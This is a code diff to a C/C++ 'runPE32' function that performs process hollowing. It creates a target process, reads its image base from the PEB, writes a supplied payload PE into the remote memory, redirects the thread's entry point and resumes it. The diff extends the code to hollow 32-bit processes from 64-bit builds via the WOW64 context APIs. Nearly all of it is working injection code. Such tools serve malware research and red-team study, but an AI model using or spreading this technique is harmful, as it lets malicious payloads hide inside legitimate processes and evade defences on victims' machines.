@@ -8,14 +8,6 @@
 #include "relocate.h"
 #include "pe_raw_to_virtual.h"
 
-bool is_system32b()
-{
-    if (sizeof(LPVOID) == sizeof(DWORD)) {
-        return true;
-    }
-    return false;
-}
-
 /*
 runPE32:
     targetPath - application where we want to inject
@@ -31,37 +23,39 @@ bool runPE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, DWORD desire
     if (!load_ntdll_functions()) return false;
 
     //check payload:
-    IMAGE_NT_HEADERS* payload_nt_hdr = get_nt_hrds(payload);
-    if (payload_nt_hdr == NULL) {
+    IMAGE_NT_HEADERS* payload_nt_hdr32 = get_nt_hrds(payload);
+    if (payload_nt_hdr32 == NULL) {
         printf("Invalid payload: %p\n", payload);
         return false;
     }
 
-    const SIZE_T kPtrSize = sizeof(LPVOID);
-    if (kPtrSize != sizeof(DWORD)) {
-        printf("System is not 32 bit\n");
-        //TODO: support 64 bit
-        return false;
-    }
-
-    const LONG oldImageBase = payload_nt_hdr->OptionalHeader.ImageBase;
-    DWORD payloadImageSize = payload_nt_hdr->OptionalHeader.SizeOfImage;
+    const LONG oldImageBase = payload_nt_hdr32->OptionalHeader.ImageBase;
+    DWORD payloadImageSize = payload_nt_hdr32->OptionalHeader.SizeOfImage;
 
     //create target process:
     PROCESS_INFORMATION pi;
     if (!create_new_process1(targetPath, pi)) return false;
     printf("PID: %d\n", pi.dwProcessId);
 
+    const SIZE_T kPtrSize = sizeof(PVOID);
+	    
+	SIZE_T targetImageBase = 0;
+	DWORD PEB = 0;
     //get initial context of the target:
+
+#if defined(_WIN64)
+    WOW64_CONTEXT context;
+    memset(&context, 0, sizeof(CONTEXT));
+    context.ContextFlags = CONTEXT_INTEGER;
+    Wow64GetThreadContext(pi.hThread, &context);
+#else	
     CONTEXT context;
     memset(&context, 0, sizeof(CONTEXT));
     context.ContextFlags = CONTEXT_INTEGER;
     GetThreadContext(pi.hThread, &context);
-    
+#endif
     //get image base of the target:
-    DWORD targetImageBase;
-    DWORD PEB = context.Ebx;
-
+    PEB = context.Ebx;
     if (!ReadProcessMemory(pi.hProcess, LPVOID(PEB + 8), &targetImageBase, kPtrSize, NULL)) {
         return false;
     }
@@ -69,7 +63,7 @@ bool runPE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, DWORD desire
 
     if (has_relocations(payload) == false) {
         //payload have no relocations, so we are bound to use it's original image base
-        desiredBase = payload_nt_hdr->OptionalHeader.ImageBase;
+        desiredBase = payload_nt_hdr32->OptionalHeader.ImageBase;
     }
     
     if (unmap_target || targetImageBase == desiredBase) {
@@ -89,7 +83,7 @@ bool runPE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, DWORD desire
     printf("Allocated remote ImageBase: %p size: %x\n", remoteAddress,  payloadImageSize);
 
     //change the image base saved in headers - this is very important for loading imports:
-    payload_nt_hdr->OptionalHeader.ImageBase = (DWORD) remoteAddress;
+    payload_nt_hdr32->OptionalHeader.ImageBase = (DWORD) remoteAddress;
 
     //first we will prepare the payload image in the local memory, so that it will be easier to edit it, apply relocations etc.
     //when it will be ready, we will copy it into the space reserved in the target process
@@ -114,7 +108,7 @@ bool runPE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, DWORD desire
         }
     }
 
-     DWORD written = 0;
+    SIZE_T written = 0;
     // paste the local copy of the prepared image into the reserved space inside the remote process:
     if (!WriteProcessMemory(pi.hProcess, remoteAddress, localCopyAddress, payloadImageSize, &written) || written != payloadImageSize) {
         printf("[ERROR] Could not paste the image into remote process!\n");
@@ -130,11 +124,15 @@ bool runPE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, DWORD desire
     }
 
     //overwrite context: set new Entry Point
-    DWORD newEP = (DWORD) remoteAddress + payload_nt_hdr->OptionalHeader.AddressOfEntryPoint;
+    DWORD newEP = (DWORD) remoteAddress + payload_nt_hdr32->OptionalHeader.AddressOfEntryPoint;
     printf("newEP: %p\n", newEP);
-    context.Eax = newEP;
-    SetThreadContext(pi.hThread, &context);
 
+    context.Eax = newEP;
+#if defined(_WIN64)
+    Wow64SetThreadContext(pi.hThread, &context);
+#else
+    SetThreadContext(pi.hThread, &context);
+#endif
     //start the injected:
     printf("--\n");
     ResumeThread(pi.hThread);
